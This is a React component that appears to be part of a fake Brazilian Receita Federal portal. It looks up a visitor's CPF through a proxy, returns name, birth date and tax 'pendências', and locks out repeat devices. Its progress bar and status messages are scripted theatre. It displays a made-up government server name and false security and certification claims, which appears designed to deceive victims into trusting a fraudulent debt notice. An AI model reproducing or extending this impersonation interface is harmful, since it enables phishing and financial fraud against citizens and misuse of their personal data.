import { useEffect, useState, useRef } from "react";
import { FileSearch, CheckCircle, Shield, Database, Server, Lock, Fingerprint } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { getDeviceId } from "@/hooks/useDeviceId";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface Pendencia {
  codigoReceita: string;
  dataVencimento: string;
  juros: number;
  multa: number;
  numeroReferencia: string;
  valorPrincipal: number;
  valorTotal: number;
}

interface LoadingScreenProps {
  cpf: string;
  recaptchaToken: string;
  onComplete: (data: { nome: string; nascimento: string; sexo: string; pendencias: Pendencia[] }) => void;
  onTabChange?: (tab: "inicio" | "consultas" | "seguranca" | "ajuda") => void;
  fast?: boolean;
}

const steps = [
  { icon: Fingerprint, title: "Autenticação", subtitle: "Validando identidade" },
  { icon: Database, title: "Base de Dados", subtitle: "Acessando registros" },
  { icon: FileSearch, title: "Análise Fiscal", subtitle: "Verificando débitos" },
  { icon: Server, title: "SERPRO", subtitle: "Sistema integrado" },
  { icon: CheckCircle, title: "Finalização", subtitle: "Gerando relatório" },
];

const formatCpf = (cpf: string) =>
  `${cpf.slice(0, 3)}.${cpf.slice(3, 6)}.${cpf.slice(6, 9)}-${cpf.slice(9)}`;

const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = false }: LoadingScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState("Iniciando consulta...");
  const hasStarted = useRef(false);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    const speed = fast ? 0.33 : 1;

    const progressInterval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) return 100;
        return Math.min(p + Math.random() * (fast ? 4 : 1.5) + 0.3, 100);
      });
    }, 300);

    const statusMessages = [
      { time: 500 * speed, text: "Conectando ao servidor da Receita Federal..." },
      { time: 2500 * speed, text: "Autenticação concluída. Acessando base de dados..." },
      { time: 5000 * speed, text: "Cruzando informações tributárias..." },
      { time: 7500 * speed, text: "Consultando sistema SERPRO..." },
      { time: 10000 * speed, text: "Consolidando resultado da análise..." },
    ];

    const timers = [
      setTimeout(() => setActiveStep(1), 2500 * speed),
      setTimeout(() => setActiveStep(2), 5000 * speed),
      setTimeout(() => setActiveStep(3), 7500 * speed),
      setTimeout(() => setActiveStep(4), 10000 * speed),
      ...statusMessages.map(({ time, text }) =>
        setTimeout(() => setStatusText(text), time)
      ),
    ];

    const fetchData = async () => {
      const startTime = Date.now();
      const MIN_DURATION = fast ? 4000 : 12000;
      try {
        const deviceId = getDeviceId();
        const [consultaRes, pendenciasRes] = await Promise.all([
          supabase.functions.invoke("api-proxy", { body: { endpoint: "/consulta", cpf, recaptchaToken, deviceId } }),
          supabase.functions.invoke("api-proxy", { body: { endpoint: "/pendencias", cpf, recaptchaToken, deviceId } }),
        ]);

        // Device lock: the proxy returns HTTP 403 with { device_locked: true }
        // supabase-js puts 4xx responses in error.context (a Response object)
        const checkDeviceLocked = async (res: { data: unknown; error: unknown }): Promise<boolean> => {
          const d = res.data as Record<string, unknown> | null;
          if (d?.device_locked === true) return true;
          const e = res.error as { context?: Response } | null;
          if (e?.context instanceof Response) {
            try {
              const json = await e.context.clone().json();
              if (json?.device_locked === true) return true;
            } catch { /* ignore */ }
          }
          return false;
        };

        const [locked1, locked2] = await Promise.all([
          checkDeviceLocked(consultaRes),
          checkDeviceLocked(pendenciasRes),
        ]);

        if (locked1 || locked2) {
          onComplete({
            nome: "DEVICE_LOCKED",
            nascimento: "--/--/----",
            sexo: "N/A",
            pendencias: [],
          });
          return;
        }

        const consultaData = consultaRes.data;
        const pendenciasData = pendenciasRes.data;

        // Only proceed if /consulta returned a valid successful response with real CPF data
        // Requires both nome AND dataNascimento to be non-empty strings
        const consultaOk =
          consultaData?.success === true &&
          consultaData?.nome &&
          typeof consultaData.nome === "string" &&
          consultaData.nome.trim().length > 0 &&
          consultaData?.dataNascimento &&
          typeof consultaData.dataNascimento === "string" &&
          consultaData.dataNascimento.trim().length > 0;

        if (!consultaOk) {
          // API didn't return valid data — block all navigation, stay stuck
          clearInterval(progressInterval);
          timers.forEach(clearTimeout);
          setProgress(0);
          setStatusText("Erro ao processar a consulta. Verifique sua conexão e tente novamente.");
          return;
        }

        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));

        setProgress(100);
        setStatusText("Consulta finalizada com sucesso.");
        await new Promise((r) => setTimeout(r, 800));

        onComplete({
          nome: consultaData.nome,
          nascimento: consultaData.dataNascimento ?? "--/--/----",
          sexo: consultaData.sexo ?? "N/A",
          pendencias: pendenciasData?.success ? pendenciasData.pendencias : [],
        });
      } catch {
        // On any exception — block navigation, do not advance
        clearInterval(progressInterval);
        timers.forEach(clearTimeout);
        setProgress(0);
        setStatusText("Erro ao processar a consulta. Verifique sua conexão e tente novamente.");
      }
    };

    setTimeout(() => fetchData(), 500);

    return () => {
      clearInterval(progressInterval);
      timers.forEach(clearTimeout);
    };
  }, [cpf, onComplete]);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader cpf={cpf} />

      <div className="w-full bg-primary/5 border-b border-border py-1.5 sm:py-2">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-[9px] sm:text-xs text-muted-foreground">
          <div className="flex items-center gap-1.5 sm:gap-2">
            <Lock className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
            <span>Sessão segura • TLS 1.3</span>
          </div>
          <span className="hidden sm:inline">Servidor: srf-prod-03.receita.fazenda.gov.br</span>
          <span className="sm:hidden">srf-prod-03</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 py-6 sm:py-10">
        <div className="w-full max-w-3xl animate-fade-in-up">
          <div className="text-center mb-6 sm:mb-8">
            <h1 className="text-lg sm:text-2xl font-extrabold text-foreground tracking-tight">Processando Consulta</h1>
            <p className="mt-1 text-xs sm:text-sm text-muted-foreground">
              CPF: <span className="font-semibold text-foreground font-mono">{formatCpf(cpf)}</span>
            </p>
          </div>

          {/* Progress bar */}
          <div className="mx-auto mb-2 max-w-lg">
            <div className="flex items-center justify-between mb-1.5 sm:mb-2">
              <span className="text-[10px] sm:text-xs font-medium text-muted-foreground">Progresso da consulta</span>
              <span className="text-[10px] sm:text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2 sm:h-2.5 overflow-hidden rounded-full bg-secondary">
              <div
                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Status text */}
          <div className="text-center mb-6 sm:mb-8">
            <p className="text-[10px] sm:text-xs text-muted-foreground italic">{statusText}</p>
          </div>

          {/* Steps */}
          <div className="mb-6 sm:mb-8 grid grid-cols-5 gap-1 sm:gap-2">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isActive = i <= activeStep;
              const isCurrent = i === activeStep;
              return (
                <div
                  key={i}
                  className={`rounded-lg sm:rounded-xl border p-2 sm:p-3 text-center transition-all duration-500 ${
                    isCurrent
                      ? "border-primary/40 bg-primary/5 shadow-md"
                      : isActive
                        ? "border-accent/30 bg-card"
                        : "border-transparent bg-card/30"
                  }`}
                >
                  <div className="mb-1 sm:mb-2 flex justify-center">
                    <div className={`flex h-7 w-7 sm:h-9 sm:w-9 items-center justify-center rounded-lg transition-all duration-500 ${
                      isCurrent
                        ? "gradient-primary shadow-sm animate-pulse"
                        : isActive
                          ? "bg-accent/10"
                          : "bg-muted"
                    }`}>
                      <Icon className={`h-3 w-3 sm:h-4 sm:w-4 transition-colors duration-500 ${
                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
                      }`} />
                    </div>
                  </div>
                  <h3 className={`text-[9px] sm:text-xs font-bold transition-colors duration-500 leading-tight ${
                    isActive ? "text-foreground" : "text-muted-foreground/40"
                  }`}>
                    {step.title}
                  </h3>
                  <p className="mt-0.5 text-[8px] sm:text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                </div>
              );
            })}
          </div>

          {/* Security notice */}
          <div className="rounded-xl sm:rounded-2xl border border-border bg-card p-3 sm:p-4 shadow-sm">
            <div className="flex items-start gap-2 sm:gap-3">
              <div className="flex h-8 w-8 sm:h-9 sm:w-9 shrink-0 items-center justify-center rounded-lg sm:rounded-xl bg-accent/10">
                <Shield className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-accent" />
              </div>
              <div>
                <h4 className="font-bold text-foreground text-xs sm:text-sm">Ambiente Seguro</h4>
                <p className="mt-0.5 text-[10px] sm:text-xs text-muted-foreground leading-relaxed">
                  Processamento em ambiente certificado ICP-Brasil. Dados transmitidos com criptografia AES-256.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <GovFooter onTabChange={onTabChange} />
    </div>
  );
};

export default LoadingScreen;
